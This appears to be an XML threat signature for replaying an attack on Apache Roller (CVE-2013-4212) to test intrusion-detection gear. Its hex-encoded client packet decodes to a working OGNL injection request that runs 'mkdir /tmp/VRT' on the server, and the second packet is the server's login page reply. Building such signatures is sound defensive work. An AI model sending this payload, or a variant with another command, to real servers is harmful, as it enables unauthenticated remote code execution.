<?xml version="1.0" encoding="utf-8"?>
<threatSignature>
  <ThreatProperties>
    <ExecDesc display="true" value="Apache Roller OGNL Injection Remote Code Execution"/>
    <EngDesc display="true" value="A command execution vulnerability exists in Apache Roller. The vulnerability is due to a lack of sanitization on OGNL expressions passed to certain methods. This can lead to OGNL injection which can result in remote code execution. A remote unauthenticated attacker could exploit this vulnerability by sending crafted requests to a site using the vulnerable application. Successful exploitation could lead to remote code execution in the context of the affected application."/>
    <Intent display="true">
      <item value="INPUT_VALIDATION_ERROR"/>
    </Intent>
    <Protocol display="true" value="HTTP,HTTPS"/>
    <Type_Of_Equipment display="true">
      <item value="Application"/>
    </Type_Of_Equipment>
    <Severity display="true" value="Critical"/>
    <Known_Vendors_Affected display="true">
      <item value="Apache_Software_Foundation"/>
    </Known_Vendors_Affected>
    <Known_Products_Affected display="true">
      <item value="Apache_Roller"/>
    </Known_Products_Affected>
    <Known_Versions_Affected display="true">
      <item value="prior_to_5.0.2"/>
    </Known_Versions_Affected>
    <Credit display="true" value="TSL20131127-01"/>
    <CVEID display="true" value="CVE-2013-4212"/>
    <bugtraqID display="true" value=""/>
    <OSVDB display="true" value="100342"/>
    <Author display="true" value=""/>
    <ID display="true" value="5c8ae44aba0caf1020f53af2504f190f"/>
    <Revision display="true" value="1"/>
    <Safe display="true" value=""/>
    <ServerSideAttack display="true" value=""/>
    <SoftwareRevision display="true" value=""/>
    <Suite display="true" value=""/>
    <RunOnce display="false" value=""/>
    <Valid_Traffic display="false" value=""/>
    <AccessVector display="false" value="NETWORK"/>
    <AccessComplexity display="false" value="low"/>
    <Authentication display="false" value="not-required"/>
    <ConfImpact display="false" value="partial"/>
    <IntegImpact display="false" value="partial"/>
    <AvailImpact display="false" value="partial"/>
    <ImpactBias display="false" value=""/>
    <FirstAdded display="false" value=""/>
    <LastModified display="false" value="635355981995762880"/>
    <SigStyle display="false" value=""/>
    <targetNode display="false" value=""/>
    <SigProtocol display="false" value=""/>
    <Rate display="false" value=""/>
    <Regex display="false" value=""/>
    <Created value="1400059818" display="true"/>
  </ThreatProperties>
  <Variables>
    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
  </Variables>
  <Loops>
    <for index="A">
      <for index="G"/>
      <for index="H"/>
    </for>
    <for index="B">
      <for index="G"/>
      <for index="H"/>
    </for>
  </Loops>
  <PostScript/>
  <Output index="A" Count="">
    <Ethernet srcMac="00:50:56:B4:0F:42" destMac="00:50:56:B4:0F:3F" pktType="0800">
      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0120" Identification="1110" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="BF8B" srcIP="172.16.8.72" destIP="$destIP" options="" CE="false" DF="true" MF="false">
        <TCP srcPort="57268" destPort="$HTTPdestPort" SeqNumber="56D9EA79" AckNumber="3527AD78" HeaderLength="08" WindowSize="00E5" Checksum="068E" UrgentPointer="0000" Options="0101080A04E7FB760622D71D" Payload="474554202F726F6C6C65722F726F6C6C65722D75692F6C6F67696E2E726F6C3F706167655469746C653D2532342537422532382532335F6D656D626572416363657373253542253232616C6C6F775374617469634D6574686F64416363657373253232253544253344747275652532432534306A6176612E6C616E672E52756E74696D6525343067657452756E74696D652532382532392E657865632532382532376D6B6469722532302F746D702F56525425323725323925324325323725323725323925374420485454502F312E310D0A486F73743A3137322E31362E382E3231323A383038300D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
      </IP>
    </Ethernet>
  </Output>
  <Input>
    <Ethernet/>
  </Input>
  <ServerSide display="1">
    <Output index="B" Count="">
      <Ethernet srcMac="00:50:56:B4:0F:3F" destMac="00:50:56:B4:0F:42" pktType="0800">
        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="05DC" Identification="7A66" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="5179" srcIP="$destIP" destIP="172.16.8.72" options="" CE="false" DF="true" MF="false">
          <TCP srcPort="$HTTPdestPort" destPort="57268" SeqNumber="3527AD78" AckNumber="56D9EB65" HeaderLength="08" WindowSize="03CC" Checksum="FDA8" UrgentPointer="0000" Options="0101080A0622D75804E7FB76" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A5365742D436F6F6B69653A204A53455353494F4E49443D31433741333039334645433643423932393837423733424546373442354644383B20506174683D2F726F6C6C65722F3B20487474704F6E6C790D0A436F6E74656E742D547970653A20746578742F68746D6C3B636861727365743D5554462D380D0A436F6E74656E742D4C656E6774683A20363533330D0A446174653A204D6F6E2C2030322044656320323031332031363A30363A313320474D540D0A0D0A0A0A0A0A0A0A0A0A0A0A0A0A0A3C21444F43545950452068746D6C205055424C494320222D2F2F5733432F2F445444205848544D4C20312E30205472616E736974696F6E616C2F2F454E222022687474703A2F2F7777772E77332E6F72672F54522F7868746D6C312F4454442F7868746D6C312D7472616E736974696F6E616C2E647464223E0A3C68746D6C20786D6C6E733D22687474703A2F2F7777772E77332E6F72672F313939392F7868746D6C223E0A202020203C686561643E0A20202020202020203C7469746C653E46726F6E7420506167653A203C2F7469746C653E0A20202020202020203C6D65746120687474702D65717569763D22436F6E74656E742D547970652220636F6E74656E743D22746578742F68746D6C3B20636861727365743D7574662D3822202F3E0A20202020202020200A20202020202020200A0A0A0A0A0A0A0A0A0A0A0A0A0A3C6C696E6B2072656C3D227374796C6573686565742220747970653D22746578742F63737322206D656469613D22616C6C2220687265663D222F726F6C6C65722F726F6C6C65722D75692F7975692F72657365742D666F6E74732D67726964732F72657365742D666F6E74732D67726964732E6373733B6A73657373696F6E69643D314337413330393346454336434239323938374237334245463734423546443822202F3E0A3C6C696E6B2072656C3D227374796C6573686565742220747970653D22746578742F63737322206D656469613D22616C6C2220687265663D222F726F6C6C65722F726F6C6C65722D75692F7975692F626173652F626173652D6D696E2E6373733B6A73657373696F6E69643D314337413330393346454336434239323938374237334245463734423546443822202F3E0A0A3C6C696E6B2072656C3D227374796C6573686565742220747970653D22746578742F63737322206D656469613D22616C6C2220687265663D272F726F6C6C65722F726F6C6C65722D75692F7374796C65732F6C61796F75742E6373733B6A73657373696F6E69643D314337413330393346454336434239323938374237334245463734423546443827202F3E0A3C6C696E6B2072656C3D227374796C6573686565742220747970653D22746578742F63737322206D656469613D22616C6C2220687265663D272F726F6C6C65722F726F6C6C65722D75692F7374796C65732F726F6C6C65722E6373733B6A73657373696F6E69643D314337413330393346454336434239323938374237334245463734423546443827202F3E0A3C6C696E6B2072656C3D227374796C6573686565742220747970653D22746578742F63737322206D656469613D22616C6C2220687265663D272F726F6C6C65722F726F6C6C65722D75692F7374796C65732F6D656E752E6373733B6A73657373696F6E69643D314337413330393346454336434239323938374237334245463734423546443827202F3E0A0A3C6C696E6B2072656C3D227374796C6573686565742220747970653D22746578742F63737322206D656469613D22616C6C22200A20202020687265663D222F726F6C6C65722F726F6C6C65722D75692F7468656D652F74616E2F636F6C6F72732E63737322202F3E0A0A3C73637269707420747970653D22746578742F6A61766173637269707422207372633D222F726F6C6C65722F7468656D652F736372697074732F726F6C6C65722E6A733B6A73657373696F6E69643D3143374133303933464543364342393239383742373342454637344235464438223E3C2F7363726970743E0A0A0A0A20202020202020203C7374796C6520747970653D22746578742F637373223E0A2020202020202020202020200A2363656E746572636F6E74656E745F77726170207B0A2020202077696474683A20313030253B0A7D0A20202020202020203C2F7374796C653E0A202020203C2F686561643E0A202020203C626F647920636C6173733D22207975692D736B696E2D73616D223E0A20202020202020200A20202020202020203C6469762069643D2262616E6E6572223E0A2020202020202020202020200A2020202020202020202020200A0A0A0A0A0A0A0A0A0A0A0A0A0A3C64697620636C6173733D2262616E6E6572537461747573426F78223E0A202020200A202020203C7461626C6520636C6173733D2262616E6E6572537461747573426F78222063656C6C70616464696E673D2230222063656C6C73706163696E673D2230223E0A20202020202020203C74723E0A2020202020202020202020203C746420636C6173733D2262616E6E65724C656674223E0A202020202020202020202020202020200A202020202020202020202020202020200A202020202020202020202020202020200A202020202020202020202020202020200A202020202020202020202020202020200A202020202020202020202020202020200A2020202020202020202020203C2F74643E0A2020202020202020202020200A2020202020202020202020203C746420636C6173733D2262616E6E65725269676874223E0A202020202020202020202020202020200A202020202020202020202020202020203C6120687265663D222F726F6C6C65722F3B6A73657373696F6E69643D3143374133303933464543364342393239383742373342454637344235464438223E46726F6E7420506167653C2F613E0A202020202020202020202020202020200A202020202020202020202020202020207C203C6120687265663D222F726F6C6C65722F726F6C6C65722D75692F6D656E752E726F6C3B6A73657373696F6E69643D3143374133303933464543364342393239383742373342454637344235464438223E4D61696E204D656E753C2F613E0A202020202020202020202020202020200A202020202020202020202020202020200A202020202020202020202020202020200A20202020202020202020202020202020202020207C203C6120687265663D222F726F6C6C65722F726F6C6C65722D75692F6C6F67696E2D72656469726563742E726F6C3B6A73657373696F6E69643D3143374133303933464543364342393239383742373342454637344235464438223E4C6F67696E3C2F613E0A20202020202020202020202020202020202020200A20202020202020202020202020202020202020200A20202020202020202020202020202020202020200A202020202020202020202020202020200A202020202020202020202020202020200A2020202020202020202020203C2F74643E0A20202020202020203C2F74723E0A202020203C2F7461626C653E0A202020200A3C2F6469763E0A0A20202020202020203C2F6469763E0A20202020202020200A20202020202020203C6469762069643D2277726170706572223E200A2020202020202020202020203C6469762069643D226C656674636F6E74656E745F77726170223E0A202020202020202020202020202020203C6469762069643D226C656674636F6E74656E74223E200A202020202020202020202020202020203C2F6469763E0A2020202020202020202020203C2F6469763E0A2020202020202020202020200A2020202020202020202020203C6469762069643D2263656E746572636F6E74656E745F77726170223E0A202020202020202020202020202020203C6469762069643D2263656E746572636F6E74656E74223E2020200A20202020202020202020202020202020202020203C68313E3C2F68313E0A20202020202020202020202020202020202020200A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A20202020202020202020202020202020202020203C212D2D0A20204C6963656E73656420746F207468652041706163686520536F66747761726520466F756E646174696F6E20284153462920756E646572206F6E65206F72206D6F72650A202020636F6E7472696275746F72206C6963656E73652061677265656D656E74732E202054686520415346206C6963656E73657320746869732066696C6520746F20596F750A2020756E6465722074686520417061636865204C6963656E73652C2056657273696F6E20322E30202874686520224C6963656E736522293B20796F75206D6179206E6F740A202075736520746869732066696C652065786365707420696E20636F6D706C69616E6365207769746820746865204C6963656E73652E0A2020596F75206D6179206F627461696E206120636F7079206F6620746865204C6963656E73652061740A0A202020202020687474703A2F2F7777772E6170616368652E6F72672F6C6963656E7365732F4C4943454E53452D322E300A0A2020556E6C657373207265717569726564206279206170706C696361626C65206C6177206F722061677265656420746F20696E2077726974696E672C20736F6674776172650A2020646973747269627574656420756E64657220746865204C6963656E7365206973206469737472696275746564206F6E20616E20224153204953222042415349532C0A2020574954484F55542057415252414E54494553204F5220434F4E444954494F4E53204F4620414E59204B494E442C206569746865722065787072657373206F7220696D706C6965642E0A202053656520746865204C6963656E736520666F7220746865207370656369666963206C616E677561676520676F7665726E696E67207065726D697373696F6E7320616E640A20206C696D69746174696F6E7320756E64657220746865204C6963656E73652E2020466F72206164646974696F6E616C20696E666F726D6174696F6E20726567617264696E670A2020636F7079726967687420696E207468697320776F726B2C20706C656173652073656520746865204E4F544943452066696C6520696E2074686520746F70206C6576656C0A20206469726563746F7279206F66207468697320646973747269627574696F6E2E0A2D2D3E0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A202020200A202020200A202020200A20202020202020203C703E506C6561736520656E74657220796F757220757365726E616D6520616E642070617373776F726420746F206C6F67696E2E3C2F703E0A202020200A202020200A202020203C666F726D206D6574686F643D22706F7374222069643D226C6F67696E466F726D22200A20202020202020202020616374696F6E3D222F726F6C6C65722F726F6C6C65725F6A5F73656375726974795F636865636B3B6A73657373696F6E69643D3143374133303933464543364342393239383742373342454637344235464438220A202020202020202020206F6E7375626D69743D2273617665557365726E616D65287468697329223E0A0A20202020202020203C7461626C652077696474683D22383025223E0A0A2020202020202020202020203C74723E0A202020202020202020202020202020203C74642077696474683D223230252220616C69676E3D227269676874223E557365726E616D653C2F74643E0A202020202020202020202020202020203C74642077696474683D22383025223E0A20202020202020202020202020202020202020203C696E70757420747970653D227465787422206E616D653D226A5F757365726E616D65222069643D226A5F757365726E616D65222073697A653D22323522202F3E0A202020202020202020202020202020203C2F74643E0A2020202020202020202020203C2F74723E0A0A2020202020202020202020203C74723E0A202020202020202020202020202020203C74642077696474683D223230252220616C69676E3D227269676874223E50617373776F72643C2F74643E0A202020202020202020202020202020203C74642077696474683D22383025223E0A20202020202020202020202020202020202020203C696E70757420747970653D2270617373776F726422206E616D653D226A5F70617373776F7264222069643D226A5F70617373776F7264222073697A653D22323022202F3E0A202020202020202020202020202020203C2F74643E0A2020202020202020202020203C2F74723E0A0A2020202020202020202020200A2020202020202020202020203C74723E0A202020202020202020202020202020203C74642077696474683D22323025223E3C2F74643E0A202020202020202020202020202020203C74642077696474683D22383025223E0A20202020202020202020202020202020202020203C696E70757420747970653D22636865636B626F7822206E616D653D225F737072696E675F73656375726974795F72656D656D6265725F6D65222069643D225F737072696E675F73656375726974795F72656D656D6265725F6D6522202F3E0A20202020202020202020202020202020202020203C6C6162656C20666F723D2272656D656D6265724D65223E0A20202020202020202020202020202020202020202020202052656D656D626572204D652028757020746F2074776F207765656B73290A20202020202020202020202020202020202020203C2F6C6162656C3E0A202020202020202020202020202020203C2F74643E0A2020202020202020202020203C2F74723E0A2020202020202020202020200A0A2020202020202020202020203C74723E0A202020202020202020202020202020203C74642077696474683D22323025223E3C2F74643E0A202020202020202020202020202020203C74642077696474683D22383025223E0A20202020202020202020202020202020202020203C696E70757420747970653D227375626D697422206E616D653D226C6F67696E222069643D226C6F67696E222076616C75653D224C6F67696E22202F3E0A20202020202020202020202020202020202020203C696E70757420747970653D22726573657422206E616D653D227265736574222069643D227265736574222076616C75653D22526573657422200A2020202020202020202020202020202020202020202020206F6E636C69636B3D22646F63756D656E742E676574456C656D656E744279496428276A5F757365726E616D6527292E666F637573282922202F3E0A202020202020202020202020202020203C2F74643E0A2020202020202020202020203C2F74723E20202020202020200A0A20202020202020203C2F7461626C653E202020200A202020203C2F666F726D3E0A0A0A0A3C73637269707420747970653D22746578742F6A617661736372697074223E0A3C212D2D0A0A69662028646F63756D656E742E676574456C656D656E744279496429207B0A2020202069662028676574436F6F6B69652822757365726E616D65222920213D206E756C6C29207B0A202020202020202069662028646F63756D656E742E676574456C656D656E744279496429207B0A202020202020202020202020646F63756D656E742E676574456C656D656E744279496428226A5F757365726E616D6522292E76616C7565203D20676574436F6F6B69652822757365726E616D6522293B0A202020202020202020202020646F63756D656E742E676574456C656D656E744279496428226A5F70617373776F726422292E666F63757328293B0A20202020202020207D0A202020207D20656C7365207B0A2020202020202020646F63756D656E742E676574456C656D656E744279496428226A5F757365726E616D6522292E666F63757328293B0A202020207D0A7D0A0A66756E6374696F6E2073617665557365726E616D6528746865466F726D29207B0A202020207661722065787069726573203D206E6577204461746528293B0A20202020657870697265732E73657454696D6528657870697265732E67657454696D652829202B203234202A203330202A203630202A203630202A2031303030293B202F2F207365747320697420666F7220617070726F7820333020646179732E0A20202020736574436F6F6B69652822757365726E616D65222C746865466F726D2E6A5F757365726E616D652E76616C75652C65787069726573293B0A7D0A2F2F2D2D3E0A3C2F7363726970743E0A0A202020202020202020202020202020203C2F6469763E0A2020202020202020202020203C2F6469763E0A2020202020202020202020200A2020202020202020202020203C6469762069643D227269676874636F6E74656E745F77726170223E0A202020202020202020202020202020203C6469762069643D227269676874636F6E74656E74223E200A202020202020202020202020202020203C2F6469763E0A2020202020202020202020203C2F6469763E0A20202020202020203C2F6469763E0A20202020202020200A20202020202020203C6469762069643D22666F6F746572223E0A2020202020202020202020200A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A0A3C696D67207372633D272F726F6C6C65722F696D616765732F74696E79666561746865722E706E673B6A73657373696F6E69643D31433741333039334645433643423932393837423733424546373442354644382720616C743D22415346206C6F676F22207374796C653D22766572746963616C2D616C69676E3A6D6964646C6522202F3E0A506F7765726564206279203C6120687265663D22687474703A2F2F726F6C6C65722E6170616368652E6F7267223E41706163686520526F6C6C6572205765626C6F676765723C2F613E2056657273696F6E20352E302E3120287231333338393438290A2020202020200A0A20202020202020203C2F6469763E0A20202020202020200A20202020202020203C6469762069643D226461746574616764697622200A202020202020202020202020207374796C653D22706F736974696F6E3A6162736F6C7574653B7669736962696C6974793A68696464656E3B6261636B67726F756E642D636F6C6F723A77686974653B6C617965722D6261636B67726F756E642D636F6C6F723A77686974653B223E0A20202020202020203C2F6469763E0A202020203C2F626F64793E0A3C2F68746D6C3E0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
        </IP>
      </Ethernet>
    </Output>
  </ServerSide>
</threatSignature>
